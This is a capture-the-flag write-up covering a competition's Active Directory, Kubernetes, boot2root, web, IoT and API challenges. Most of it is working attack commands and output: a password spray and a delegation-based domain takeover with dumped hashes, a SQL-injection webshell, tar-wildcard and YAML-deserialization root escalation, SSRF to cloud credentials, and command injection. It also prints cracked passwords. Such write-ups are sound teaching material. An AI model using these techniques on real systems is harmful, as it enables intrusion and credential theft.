One hard rule up front: don't `nmap -p-` these boxes. A full-port scan trips an automatic ban that firewalls the good ports (SSH, SMB) for your IP, and there's no undoing it. We found that out on `connections`, where it firewalled our own vantage off the box.

**Points: 9050 (+500)**

### Recon

Cloudflare fronts everything with a wildcard cert, so CT logs only leak the quals-era names. Passive enum plus HTTP probing is the way in.

```bash
subfinder -d thesecuretrust.com -silent -all | sort -u
```

The `crt.sh` transparency dump is the same short list, all of it left over from the quals:

```bash
curl -s 'https://crt.sh/?q=%25.thesecuretrust.com&output=json' | jq -r '.[].name_value' | sed 's/\*\.//' | sort -u
```

```text
beacon.hub.thesecuretrust.com
broker.hub.thesecuretrust.com
git.staging.thesecuretrust.com
mobile.api.thesecuretrust.com
partners.thesecuretrust.com
registry.kube1.thesecuretrust.com
registry.kube2.thesecuretrust.com
secops.thesecuretrust.com
servicedesk.thesecuretrust.com
services.thesecuretrust.com
thesecuretrust.com
vault.hub.thesecuretrust.com
www.thesecuretrust.com
```

Because it's a wildcard, DNS resolves for everything, so a live host is told from a decoy only by whether the origin answers or Cloudflare returns error `1002` (no origin). We probe, we don't resolve:

```bash
while read h; do
  curl -sk --max-time 8 "https://$h/" | grep -q "error code: 1002" \
    && echo "NOORIGIN $h" || echo "LIVE $h"
done < candidates.txt
```

That gives the live estate: `medcore` / `mediclaim` (AD), `node-gateway` (k3s), `claims-platform`, `members`, `sockets`, `lifebridge`, `api-gateway`, `telemetry-gateway` (IoT), `assistant`, `connections`, and a `git` Gitea. Every one is just a landing page until you start poking, and the MediClaim gateway even prints its own internal topology:

{{< figure src="recon-mediclaim.png" alt="MediClaim Systems AD gateway" >}}

Object storage mattered too. The mobile apps and a cloud challenge live in Azure Blob, and account names resolve globally only if they exist:

```bash
for a in gencysmobileapplications claimdrop836629 securetrust; do
  dig +short "$a.blob.core.windows.net" | grep -q store && echo "EXISTS: $a"
done
```

Each live host then gets a targeted service scan, never a full `-p-`. The `connections` file server is a fair sample of what one turns up:

```bash
nmap -Pn -T4 --top-ports 200 -sV --open connections.thesecuretrust.com
```

```text
Nmap scan report for connections.thesecuretrust.com (20.219.90.234)
Host is up (0.079s latency).
Not shown: 191 filtered tcp ports (no-response), 5 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
80/tcp   open  http        nginx 1.24.0 (Ubuntu)
445/tcp  open  netbios-ssn Samba smbd 4
8080/tcp open  http        Apache httpd 2.4.52 ((Ubuntu) Python/3.10.12)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Active Directory

#### MedCore Regional Hospital

A targeted scan of `medcore.thesecuretrust.com` shows a vanilla Windows DC: `88/kerberos`, `389,636/ldap`, `445/smb`, `5985/winrm`, domain `medcore.health`, DC `GenCyS-AD-DC01`.

```bash
nmap -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sV --open 20.44.55.78
```

```text
Nmap scan report for 20.44.55.78
Host is up (0.0093s latency).
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-05 07:35:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: medcore.health, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: GenCyS-AD-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**The password spray, and where the pattern came from.** The spray pattern was not a guess; it came from another box. The `connections` file server exposed an account export over anonymous SMB, an `fs01_account_export.tar.gz` sitting in `//FS01/public`, and cracking the `/etc/shadow` inside it gave real credentials:

```text
finance_backup : Winter2024!
archive_2019   : Autumn2022!
```

That's the org's password policy, *observed from cracked passwords*, not assumed. So against MedCore we generate the whole seasonal set and spray it at the service accounts:

```bash
kerbrute userenum -d medcore.health --dc 20.44.55.78 userlist.txt
for s in Spring Summer Autumn Fall Winter; do
  for y in 2023 2024 2025 2026; do printf '%s%s!\n%s%s\n' "$s" "$y" "$s" "$y"; done
done > seasons.txt
while read -r p; do
  kerbrute passwordspray -d medcore.health --dc 20.44.55.78 users_valid.txt "$p"
done < seasons.txt
```

The spray lands two service accounts, `svc_scan` on `Autumn2025!` and `svc_sql` on `Summer2024!`, and `Autumn2025!` is the one that matters here. It's later corroborated on the DC itself: the onboarding share leaks `t.anderson:Helpdesk#Temp2026!` and the build user is `a.reyes:Sunshine2025`, same house style, two independent boxes.

**The real bug is constrained delegation.** Enumerating what `svc_scan` can do is where the box opens up: it has `TRUSTED_TO_AUTH_FOR_DELEGATION` set and `msDS-AllowedToDelegateTo` pointing at CIFS on the DC. That's constrained delegation *with protocol transition*, so `svc_scan` can request a ticket as any user:

```bash
impacket-findDelegation 'medcore.health/svc_scan:Autumn2025!' -dc-ip 20.44.55.78
```

So we S4U2Self+S4U2Proxy to mint a CIFS ticket impersonating `ctfadmin` (RID 500, Domain Admin), and DCSync, with no golden ticket needed, which the flag name references:

```bash
impacket-getST -spn CIFS/GenCyS-AD-DC01.medcore.health -impersonate ctfadmin \
    'medcore.health/svc_scan:Autumn2025!' -dc-ip 20.44.55.78
export KRB5CCNAME=ctfadmin@CIFS_GenCyS-AD-DC01.medcore.health@MEDCORE.HEALTH.ccache
impacket-secretsdump -k -no-pass GenCyS-AD-DC01.medcore.health -just-dc
```

```text
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
ctfadmin:500:aad3b435b51404eeaad3b435b51404ee:9214cc3caadee1691f4a8c9b157fd5b9:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5cdcf5ccd21c303a78bded1d0f36b555:::
medcore.health\da_admin:1122:aad3b435b51404eeaad3b435b51404ee:ad1ed7d857c4ad5f558ccc26554e31af:::
GenCyS-AD-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:4df61414fc55c48c33a1e3e0873351c1:::
[*] Kerberos keys grabbed
[... omitted ...]
```

The dump lands `ctfadmin`'s NT hash `9214cc3caadee1691f4a8c9b157fd5b9`, so pass it straight to WinRM:

```bash
evil-winrm -i 20.44.55.78 -u ctfadmin -H 9214cc3caadee1691f4a8c9b157fd5b9
```

```text
Evil-WinRM shell v4.1

Info: Establishing connection to remote endpoint

Info: Connection successful

*Evil-WinRM* PS C:\Users\ctfadmin\Documents> type C:\Users\Administrator\Desktop\root.txt
```

{{< figure src="ad-root.png" alt="Evil-WinRM as ctfadmin reading root.txt on GenCyS-AD-DC01" >}}

```
UST_GenCyS_CTF{d0ma1n_4dm1n_via_ADCS_ESC1_n0_g0ld3n_t1ck3t}
```

There's a second road baked in: a vulnerable ADCS template `MedCoreWebEnrollment` (`ENROLLEE_SUPPLIES_SUBJECT`, no manager approval), plain ESC1, which the flag name references. `certipy req … -template MedCoreWebEnrollment -upn ctfadmin@medcore.health` lands the same DA. Either works; we took delegation.

### Kubernetes

#### ClusterFall

`node-gateway` is a Flask pod with a diagnostics helper that shells out, and it gives up two RCE primitives that both land as root inside the pod. The `ping` helper concatenates its `host` parameter straight into a shell command, so appending `;id` comes back as `uid=0`, and there is a Jinja2 SSTI on `/profile` as a second way in:

```bash
curl "https://node-gateway.thesecuretrust.com/tools/ping?host=127.0.0.1%3Bid"
```

```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.044 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.044/0.044/0.044/0.000 ms
uid=0(root) gid=0(root) groups=0(root)
```

The pod itself is enough, because it's privileged with `hostPath "/"` mounted at `/host`, so the node's entire filesystem is right there, including the k3s node admin cert, which is cluster-admin:

```bash
mount | grep /host
```

```text
/dev/sda1 on /host
```

```bash
curl --cacert server-ca.crt --cert client-admin.crt --key client-admin.key \
     https://10.43.0.1:443/api/v1/namespaces
```

```text
default
dev
gcyfs-scoring
kube-node-lease
kube-public
kube-system
monitoring
production
testing
vault-prod
```

Walk the namespaces and read the challenge's own flag secret in `vault-prod`:

```bash
chroot /host /usr/local/bin/k3s kubectl -n vault-prod get secret final-flag -o jsonpath='{.data.FLAG4}' | base64 -d
```

```text
GenCyS_PROOF{stage4-final-f4e45daa9659690d2fc21c8e}
```

That `vault-prod/final-flag` secret decodes to a `GenCyS_PROOF{...}` stage token, not the scored string; the per-team `UST_GenCyS_CTF{...}` flag is minted by the in-cluster `gcyfs-scoring` NodePort service on `:30082`. (More on what *else* was in that cluster below.) Its sibling Nightmare (RBAC, a separate cluster) landed too, via a teammate.

### Boot2Root

#### LifeBridge

A four-tier privilege ladder on `lifebridge.thesecuretrust.com`.

**Initial access as www-data, via blind SQLi to a webshell.** `claim_status.php` is blind-injectable on `policy`. A plain `UNION SELECT` trips the WAF:

```bash
curl -s -X POST http://lifebridge.thesecuretrust.com/claim_status.php \
  --data-urlencode "policy=x' UNION SELECT 1,2-- -"
```

```text
<link rel='stylesheet' href='/style.css'><div class='card'><h2>Request blocked</h2><p>LifeBridge WAF rule 100 (SQLI-UNION) triggered. This request has been logged.</p><p><a class='backlink' href='/'>&larr; Back</a></p></div>
```

The rule only matches `union<space>select`, so an inline comment in place of the whitespace slips past it, and a boolean oracle (`policy=zzzz' OR (cond)-- -`, TRUE and FALSE told apart by the response card) confirms the DB account:

```bash
python3 bsqli.py "SELECT current_user()" user
```

```text
[user] len=15 webapp@127.0.0.1
webapp@127.0.0.1
```

MySQL has `FILE` priv and `/var/www/html/uploads` is world-writable, so we drop a shell with `INTO OUTFILE`. The hex literal is just a `<?php system($_GET["c"]); ?>` webshell:

```bash
curl -s -X POST http://lifebridge.thesecuretrust.com/claim_status.php --data-urlencode \
  "policy=zzzz' UNION/**/SELECT 0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e,0x42 INTO OUTFILE '/var/www/html/uploads/lbsh.php'-- -"
```

The write returns an empty body on success; the shell answers as `www-data`:

```bash
curl -s "http://lifebridge.thesecuretrust.com/uploads/lbsh.php?c=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**From www-data up to claimsvc, via a tar wildcard.** A cron in `/etc/cron.d/claims-backup` runs `tar` as `claimsvc` over a world-writable dir, expanding a `*` glob into the archive arguments:

```bash
curl -s "http://lifebridge.thesecuretrust.com/uploads/lbsh.php?c=cat%20/etc/cron.d/claims-backup"
```

```text
* * * * * claimsvc  cd /var/spool/claims/incoming && /bin/tar -czf ...archive... *
```

Plant a payload plus two filenames that `tar` reads as `--checkpoint` options, and the next run executes `cmd.sh` as `claimsvc`. Here `cmd.sh` prints `id` and `sudo -l`:

```bash
cp cmd_lb.sh /var/spool/claims/incoming/cmd.sh
cd /var/spool/claims/incoming
touch './--checkpoint=1'
touch './--checkpoint-action=exec=sh cmd.sh'
```

```text
==CLAIMSVC==
uid=1000(claimsvc) gid=1000(claimsvc) groups=1000(claimsvc)
==SUDO==
User claimsvc may run the following commands on medivault:
    (hl7bridge) NOPASSWD: /opt/medivault/bin/hl7-validate.sh
[... omitted ...]
```

**From claimsvc up to hl7bridge, via sudo injection.** That `sudo` entry runs `hl7-validate.sh`, which does `COUNT=$(sh -c "grep -c '^MSH' $FILE")` with the argument unsanitised. Break out of it to run as `hl7bridge` and stage a `.job` file into the ETL queue that `hl7bridge` owns:

```bash
sudo -n -u hl7bridge /opt/medivault/bin/hl7-validate.sh "/dev/null; id; cp /var/spool/claims/incoming/job_lb.job /opt/medivault/etl/queue/job_lb.job; chmod 666 /opt/medivault/etl/queue/job_lb.job; ls -la /opt/medivault/etl/queue"
```

```text
uid=1001(hl7bridge) gid=1001(hl7bridge) groups=1001(hl7bridge)
[... omitted ...]
-rw-rw-rw- 1 hl7bridge hl7 ... job_lb.job
```

**From hl7bridge to root, via YAML deserialization.** A root cron runs `etl_runner.py`, which calls `yaml.load(fh, Loader=yaml.Loader)` over the hl7bridge-writable `queue/*.job` files. The staged job is a deserialization gadget that runs `root_lb.sh` as root:

```yaml
!!python/object/apply:os.system ["sh /var/spool/claims/incoming/root_lb.sh"]
```

```text
==ROOT==
uid=0(root) gid=0(root) groups=0(root)
```

Read from `/root/root.txt`:

```
UST_GenCyS_CTF{bl1nd_sql1_2_r00t_cl41ms_pwn3d}
```

### Web Application

#### Benefits & Coverage

{{< figure src="web-benefits.png" alt="Enterprise Claims & Operations Gateway" >}}

The map called this SSTI; verifying says otherwise. There is no SSTI. What's exposed is OS command injection and an arbitrary file read, with a `DECOY_FLAG` env var planted as a distractor:

```bash
curl -sk -A 'Mozilla/5.0' https://claims-platform.thesecuretrust.com/api/diagnostics/run \
  -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1; find /app -maxdepth 4 -type f -printf \"%p\\t%s\\n\" 2>/dev/null | sort"}'
```

```text
{"command":"/usr/bin/ping -c 1 -W 2 127.0.0.1; find /app -maxdepth 4 -type f -printf \"%p\\t%s\\n\" 2>/dev/null | sort","exit_code":0,"output":"PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.027/0.027/0.027/0.000 ms\n/app/app.py\t20614\n/app/requirements.txt\t46\n/app/static/favicon.png\t976\n/app/static/notice.txt\t349\n"}
```

The server reflects the exact `cmd` it built (`/usr/bin/ping -c 1 -W 2 <host>`, run with `shell=True`), so the injected `find` runs as the `app` user. The file-read primitive confirms the trap: `/proc/self/environ` carries a `DECOY_FLAG` next to the real Kubernetes service env.

```bash
curl -sk -A 'Mozilla/5.0' \
  'https://claims-platform.thesecuretrust.com/api/files/read?path=/proc/self/environ'
```

```text
{"content":"PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=gcybank-portal-64f7474bfc-t55d2 LANG=C.UTF-8 GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305 PYTHON_VERSION=3.12.14 [... omitted ...] BANK_NAME=HealthShield Insurance ENV_NAME=prod DECOY_FLAG=GenCyS{this_is_not_the_flag_keep_looking} KUBERNETES_PORT=tcp://10.43.0.1:443 GCYBANK_PORTAL_SERVICE_HOST=10.43.177.224 [... omitted ...] HOME=/home/app ","path":"/proc/self/environ"}
```

Reading `/app/app.py` the same way shows the real gate: `GET /flag` on the internal `payments-internal.gcybank-vault.svc.cluster.local:8081` service returns the flag once an `X-Team-Token` header is present, and the token value is never validated. Chain the injection one hop further and have the pod curl that internal service itself. Ignore the decoy.

```bash
curl -sk -A 'Mozilla/5.0' https://claims-platform.thesecuretrust.com/api/diagnostics/run \
  -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1; curl -s -u reconciliation:<REDACTED> -H \"X-Team-Token: x\" http://payments-internal.gcybank-vault.svc.cluster.local:8081/flag"}'
```

```
UST_GenCyS_CTF{1ea89570e59ec79f4be2333d}
```

#### Member Claims Portal

{{< figure src="web-members.png" alt="HealthShield member portal" >}}

`POST /claims/preview {"url":"..."}` does a server-side fetch. The SSRF filter blocks the private ranges, but the fetcher follows 3xx redirects without re-validating, so bounce off a public open-redirect into the internal services (a mock IMDS on `:7002`, an edge on `:7001`). Point the fetch at a public redirector that lands on the mock IMDS and its credentials come straight back:

```bash
curl -sk -A 'Mozilla/5.0' -H 'Content-Type: application/json' \
  -d '{"url":"https://nghttp2.org/httpbin/redirect-to?url=http://127.0.0.1:7002/meta-data/iam/security-credentials/nightfall-deploy&status_code=302"}' \
  https://members.thesecuretrust.com/claims/preview
```

```text
{"Code":"Success","Type":"AWS-HMAC","AccessKeyId":"AKIA_NIGHTFALL_DEPLOY","SecretAccessKey":"<REDACTED-SECRET>","Token":"<REDACTED-TOKEN>"}
```

A second bug does the rest: a `/rules/eval` helper permits `fmt(template)`, which is Python `str.format` with `ctx` bound to the live `fmt` function, so format-field traversal reaches `fmt.__globals__` and reads the `FLAG` global straight out of memory:

```bash
curl -sk -A 'Mozilla/5.0' -H 'Content-Type: application/json' \
  -d '{"expr":"fmt(\"{ctx.__globals__[FLAG]}\")"}' \
  https://members.thesecuretrust.com/rules/eval
```
```
UST_GenCyS_CTF{5yc4oyf53yrsmwtct5d4lrv5}
```

#### MediSure Sockets

The portal talks to a realtime service over a JSON WebSocket at `/ws`, and the client bundle gives the bug away:

```js
// Analysts get the SIU workspace. Members never do.
// Availability is decided here, on the client, from the session role ...
```

Authorization for the SIU workspace is decided client-side: the server streams the events to everyone, the UI just hides them. Register a member through `/api/login`, which hands back an `ms_session` JWT:

```bash
curl -sk -c cookies.txt -H 'Content-Type: application/json' \
  -d '{"username":"siu_probe_18235","password":"<REDACTED>"}' \
  https://sockets.thesecuretrust.com/api/login
```

```text
ms_session	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjQ5LCJ1c2VybmFtZSI6InNpdV9wcm9iZV8xODIzNSIsIm1lbWJlcklkIjoiTUJSLWZiMTdhYTkyIiwicm9sZSI6Im1lbWJlciIsInRlbmFudCI6Im5vcnRoc3RhciIsImlhdCI6MTc4ODU5MzY4MSwiZXhwIjoxNzg4NTk3MjgxfQ.<REDACTED-HS256-SIG>
```

That token decodes to `{"sub":49,"username":"siu_probe_18235","role":"member","tenant":"northstar",...}`, a plain member and not an `siu_analyst`. Reuse it as the `?token=` query param on the `/ws` upgrade, then send the `siu.subscribe` frame the member UI never emits. The server never re-checks the role, so it streams the SIU casefile back and the `siu.case` frame's `case.resolutionCode` is the flag:

```bash
python3 probe.py "$JWT_TOKEN"
```

```
UST_GenCyS_CTF{bd534b6c471e5e6fcee38ae9}
```

### IoT

Everything IoT sits behind `telemetry-gateway.thesecuretrust.com`, and its `:8000` status page maps each raw service to a challenge.

{{< figure src="iot-status.png" alt="IoT & Facility Telemetry Portal" >}}

#### HealthShield Protocol

Unauthenticated Modbus/TCP write access to a vault interlock controller. State is per-connection and roles/nonce randomize each session, but the auth transform is a fixed XOR. All in one TCP session: disarm a coil, read the observable input register, then commit both control registers atomically, with `override = observable XOR 0x55AA` for the primary stage and `code XOR 0x2A3C` for the secondary, each as a single `fn16` write. The primary write answers with `PRIMARY UNLOCK ... CODE: NNNN`, and feeding that `CODE` into the secondary write returns `VAULT: OPEN - DIAG: <flag>`:

```python
c.write_coil(disarm_coil, True)
obs = c.read_input_registers(obs_addr, 1).registers[0]
c.write_registers(500, [obs ^ 0x55AA, 1])
c.write_registers(700, [code ^ 0x2A3C, 1])
```

Each `fn16` write reads the status register back. The primary write confirms and hands over the one-time `CODE` (it randomizes per session), and the secondary write, seeded with `CODE XOR 0x2A3C`, opens the vault:

```text
PRIMARY UNLOCK CONFIRMED - SECONDARY AUTHORIZATION REQUIRED - CODE: <NNNN>
VAULT: OPEN - DIAG: UST_GenCyS_CTF{f9a3c81d7e4520b6dc1fa97e34b85a2106ce7d4f}
```
```
UST_GenCyS_CTF{f9a3c81d7e4520b6dc1fa97e34b85a2106ce7d4f}
```

#### HealthShield Portal

Browsing the OPC-UA server (`:4840`) hands you the plan in plaintext object attributes: a `CreatePlayerSession()` method and an MQTT topic template.

```bash
python3 opcua_browse.py
```

```text
[ns=2;i=1] VaultGateway desc='VaultGateway'
  [ns=2;i=2] SystemName  = 'HealthShield Industrial Vault Controller v2.4'
  [ns=2;i=3] ServerSalt  = 'HealthShield_IoT_Gateway_Salt_2026'
  [ns=2;i=4] MqttTopicTemplate  = 'healthshield/vault/session/{session_id}/unlock'
  [ns=2;i=5] VaultLockState  = 'LOCKED'
  [ns=2;i=6] VaultFlag  = 'FLAG_RESTRICTED: Execute key-exchange via CreatePlayerSession and unlock over private MQTT topic'
  [ns=2;i=7] CreatePlayerSession desc='CreatePlayerSession'
    [ns=2;i=8] InputArguments  = [Argument(Name=None, DataType=NodeId(Identifier=12 ...))]
    [ns=2;i=9] OutputArguments = [Argument x4 (String) ...]
```

Calling `CreatePlayerSession("x")` returns a session id, a nonce, a token, and the flag topic:

```bash
python3 opcua_call.py
```

```text
CreatePlayerSession('player1')
['sess_18b9560e', '1fa9b18f07e9', 'tok_813673a3c6bc5910', 'healthshield/vault/session/sess_18b9560e/flag']
```

Publish the unlock command to that session's unlock topic on the anonymous MQTT broker (`:1883`), and the flag topic delivers the result:

```text
publish  healthshield/vault/session/sess_18b9560e/unlock  {"token": "tok_813673a3c6bc5910", "command": "unlock"}
{"status":"UNLOCKED","event":"VAULT UNLOCKED","session_id":"sess_18b9560e","flag":"UST_GenCyS_CTF{01e9d2788b51288a7da35711}", [... omitted ...]}
```

The flag topic then carries `{"status": "UNLOCKED", "flag": "UST_GenCyS_CTF{...}"}`.
```
UST_GenCyS_CTF{01e9d2788b51288a7da35711}
```

#### Lost in the Echo

The artifact is a sigrok logic capture (`ctf.sr`) behind an XFF-gated download. An `X-Forwarded-For: 127.0.0.1` header satisfies the "Internal Gateway Only" check and the origin hands over the file:

```bash
curl -s -D - -H 'X-Forwarded-For: 127.0.0.1' http://20.219.101.159:8000/api/v1/download/logic-capture -o ctf.sr
```

```text
HTTP/1.1 200 OK
Server: gunicorn
Content-Disposition: attachment; filename=ctf.sr
Content-Type: application/octet-stream
Content-Length: 131364
Last-Modified: Fri, 04 Sep 2026 04:46:23 GMT
ETag: "1788497183.0-131364-1427376096"
Accept-Ranges: bytes
```

Eight channels, only D0 active, so single-wire UART. The twist is in the edge-gap histogram: two baud rates split by a ~1s idle. The 9600-baud burst decodes at 7N1 to a U-Boot boot log that names the encoding:

```bash
python3 decode_uart.py ctf.sr
```

```text
capture=ctf.sr
samples=120784384 duration=5.032683s

baud=9600 framing=7N1 bytes=1052 segments=435 printable_ratio=0.4135
segment=0 ascii=U-Boot SPL 2020 (Jun 22 2020 - 10:09:17 +0000)..Trying to boot from MMC1..spl: Image authenticated successfully..U-Boot 2020.07-svn540 (Jun 22 2020 - 10:09:06 +0000)..CPU clock speed:   792MHz..Loading Kernel..Kernel Loaded Succesfully..CPU clock speed:   792MHz..Encoding the secret with shift 13..Copying the secret codes to vault..echo "HFG_TraPlF_PGS{...\r\n\r\n\r\nDetected noise on the line.. Falling back to lower transmission speed\r\n
[... 1200-baud segments follow ...]
```

The 1200-baud burst carries the payload: space-separated ASCII `0`/`1` that groups into bytes, then ROT13 (the "shift 13" from the boot log):

```text
RAW BINARY PAYLOAD (1200 baud):
01001000 01000110 01000111 01011111 01010100 01110010 01100001 01010000 01101100 01000110 01011111 01010000 01000111 01010011 01111011 [... omitted ...] 01111101

ASCII : HFG_TraPlF_PGS{20qo1716653o42o4r66442p1qpo11860}
ROT13 : UST_GenCyS_CTF{20db1716653b42b4e66442c1dcb11860}
```

```
UST_GenCyS_CTF{20db1716653b42b4e66442c1dcb11860}
```

### API Security

#### MediConnect Endpoints

The `api-gateway` Swagger (`/api-docs`) is fully populated, `Admin` and `Debug` tags included.

{{< figure src="api-swagger.png" alt="MediConnect API Swagger" >}}

Three bugs stack. First, `/debug/config` takes no auth at all and hands back the staging config. The AWS keys in it are the public `EXAMPLE` placeholders, but the database, redis, and SMTP passwords sitting next to them are live:

```bash
curl -s https://api-gateway.thesecuretrust.com/debug/config
```

```text
{"app_version":"2.1.3-beta","environment":"staging","database":{"host":"db-staging.mediconnect-internal.local","port":5432,"name":"mediconnect_staging","user":"mc_readonly","password":"<REDACTED>"},"redis":{"host":"redis-staging.mediconnect-internal.local","port":6379,"password":"<REDACTED>"},"aws":{"region":"ap-south-1","s3_bucket":"mediconnect-docs-staging","access_key_id":"AKIAIOSFODNN7EXAMPLE","secret_access_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"},"smtp":{"host":"smtp.mediconnect-internal.local","user":"noreply@mediconnect-ust.local","password":"<REDACTED>"},"api_keys":{"payment_gateway":"sk_test_REVOKED_4eC39HqLyjWDarjtT1zdp7dc","sms_provider":"SG.REVOKED.fake-sendgrid-key-do-not-use"},"_disclaimer":"These are staging/test credentials for development only."}
```

Second, `GET /claims/{id}` is BOLA. Register a plain policyholder for a Bearer token (mine came back as `user_id 57`), then read a claim that belongs to someone else. Claim `10042` is owned by `user_id 3`, and the server serves it anyway:

```bash
curl -s https://api-gateway.thesecuretrust.com/claims/10042 \
  -H "Authorization: Bearer $TOKEN"
```

```text
{"id":10042,"user_id":3,"policy_id":"POL-2023-00301","type":"cashless","hospital_name":"Apollo Hospitals, Hyderabad","provider_id":"HOSP-001","diagnosis":"Cardiac Catheterization","diagnosis_code":"I25.10","admission_date":"2024-08-01","discharge_date":"2024-08-05","claim_amount":850000,"approved_amount":null,"status":"under_review","patient_name":"Claims Operations Admin","patient_aadhaar_last4":"1001","internal_notes":"HIGH PRIORITY [... omitted ...]"}
```

The `internal_notes` point straight at the third bug: BFLA on `GET /admin/claims/{id}/audit`, documented "requires staff role" but never enforced, which returns `200` with the flag in its `audit_flag` field to that same policyholder token:

```bash
curl -s https://api-gateway.thesecuretrust.com/admin/claims/10042/audit \
  -H "Authorization: Bearer $TOKEN"
```

```text
{"claim_id":10042,"status":"approved","reviewer":"claims-ops-admin","review_date":"2024-08-20T15:30:00Z","audit_trail":[{"action":"claim_filed","by":"policyholder"},{"action":"auto_assigned","by":"system"},{"action":"under_review","by":"claims-ops-admin"},{"action":"compliance_check","by":"compliance-bot"}],"compliance_status":"passed","risk_score":0.12,"audit_flag":"UST_GenCyS_CTF{mediconnect_endpoints_dynamic_flag}"}
```

There's also a JWT `alg:none` forgery that flips `/admin/analytics` and `/admin/claims/pending` from `403` to `200`, though the flag comes straight from the BFLA.

```
UST_GenCyS_CTF{mediconnect_endpoints_dynamic_flag}
```

### The Git Leak

A little way in, two notices went up on the scoreboard, and one of them opened up several challenges at once.

{{< figure src="git-hint.png" alt="CTFd notifications: the Git hint, and the automated-agent ban" >}}

"Investigate the .git history carefully for what was left behind in the git portals." The Gitea box at `git.thesecuretrust.com` was serving an indexed `.git/` directory straight over the web. The config alone maps the setup and points at the Azure static site behind it:

```bash
curl -s https://git.thesecuretrust.com/.git/config
```

```text
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
	name = HealthShield DevSecOps
	email = devsecops@thesecuretrust.com
[remote origin]
	url = https://claimdrop836629.z30.web.core.windows.net/
```

`HEAD` and the commit message name the initial drop:

```bash
curl -s https://git.thesecuretrust.com/.git/HEAD
curl -s https://git.thesecuretrust.com/.git/COMMIT_EDITMSG
```

```text
ref: refs/heads/main
Initial commit: exposed staging vault & audit logs
```

The index lists exactly what got committed, and one tracked file should never have shipped:

```bash
curl -s https://git.thesecuretrust.com/.git/index | strings
```

```text
audit_verbose.log
credentials.env
db_backup_decoy.sql
hsm_master_key.bin
shadow_passwords.bak
[... binary omitted ...]
```

Pulling `credentials.env` out of that committed tree is the whole prize (we read it live but never saved the raw bytes):

```bash
curl -s https://git.thesecuretrust.com/.git/credentials.env
```

Most of it is decoy, the AWS keys are the well-known AWS `EXAMPLE` placeholders, but the last two lines are real: a `GIT_USERNAME=gituser` and its `GIT_PASSWORD`. Those creds sign into the Gitea UI and expose the whole `healthshield-group` org: fifty repositories, one per challenge, full source and history. A run of challenges that had looked like locked black boxes turned into plain code review.

{{< figure src="gitea-explore.png" alt="The healthshield-group Gitea org: fifty enterprise repositories, decoys mixed with the real challenge sources" >}}

Most of them are stage-dressing (`securetrust-saml-sso`, `securetrust-pci-dss-sanitizer`, a dozen more "enterprise" repos that go nowhere), and a handful are the actual challenges hiding in the same list: `race-to-riches-claim-payout`, `operation-healthtrace-forensics`, `mediclaim-assets-forensics`, `healthcare-smart-contract`. (The notice above the hint is the organizers announcing they'd banned a competitor for automated-agent activity.)

The repos it opened up span half a dozen categories on the board, so the rest of this run is grouped under those.

### Source Code Review

#### Fix the Portal

A "spot the bugs and repair them" exercise over a Java/Spring claims portal, where the grader is the project's own immutable CI pipeline. At launch it deletes your copies of the tests and SAST rules and restores its own, so you can't weaken the gate, you actually have to fix the code. The planted flaws are common enterprise defects, and each wants a real remediation:

- **Auth:** swap MD5 password storage for BCrypt and rip out the `admin` / `admin123` backdoor.
- **JWT:** drop the hardcoded signing key, load `jwt.secret` from `JWT_SECRET`, and size the HMAC key consistently across the auth and transaction modules.
- **SQLi:** parameterize the customer `LIKE` search.
- **XXE:** reject doctypes and external entities, disable XInclude and entity expansion.
- **Path traversal:** canonicalize the statements directory and the requested file, then enforce containment.
- **IDOR:** only let the sender or receiver read a transfer's details.
- **Race:** make the send transactional and pessimistically lock the sender row before it checks and debits the balance.
- Plus env-substituted secrets in the properties files, redacted audit logging, `SecureRandom` OTPs, and deleting a trust-all TLS manager.

Get all six gates green and the pipeline (14/14 tests, clean Semgrep) builds the release and stamps the flag into `release/HealthShield-Release.zip`:

```bash
docker build -t repo-pipeline -f pipeline/Dockerfile .
docker run --rm -e PAC=07DCA73C -v "$PWD:/workspace" -w /workspace repo-pipeline bash /workspace/pipeline/run.sh
```

```text
Stage 1 Passed: SAST scan clean (0 findings)
Stage 2 Passed: Authentication secured (3 tests)
Stage 3 Passed: Injection vulnerabilities mitigated (3 tests)
Stage 4 Passed: Business logic and authorization verified (4 tests)
Stage 5 Passed: Configuration secrets secured (1 test)
Stage 6 Passed: Logging and cryptography validated (3 tests)
ALL PIPELINE GATES PASSED
```

